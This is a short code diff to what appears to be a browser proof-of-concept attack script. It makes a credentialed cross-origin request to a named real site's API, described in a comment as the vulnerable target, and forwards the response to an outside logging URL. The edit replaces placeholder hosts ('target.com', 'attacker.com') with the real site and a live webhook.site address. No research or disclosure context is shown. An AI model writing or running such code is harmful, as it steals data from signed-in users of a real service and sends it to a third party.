@@ -10,16 +10,12 @@
       // The target vulnerable API endpoint
       const target = "https://www.nerdwallet.com/api/supergraph";
 
-      fetch("https://target.com/api/secret", {
-  method: "GET",
-  credentials: "include",
-  headers: {
-    "Token": token,
-    "Fingerprint": fingerprint
-  }
+      fetch("https://www.nerdwallet.com/api/supergraph", {
+  method: "POST",
+  credentials: "include"
 })
 .then(res => res.text())
-.then(data => fetch("https://attacker.com/log", {
+.then(data => fetch("https://webhook.site/57d05575-394e-4d7f-b280-b805ce1da79e", {
   method: "POST",
   body: data,
   mode: "no-cors"
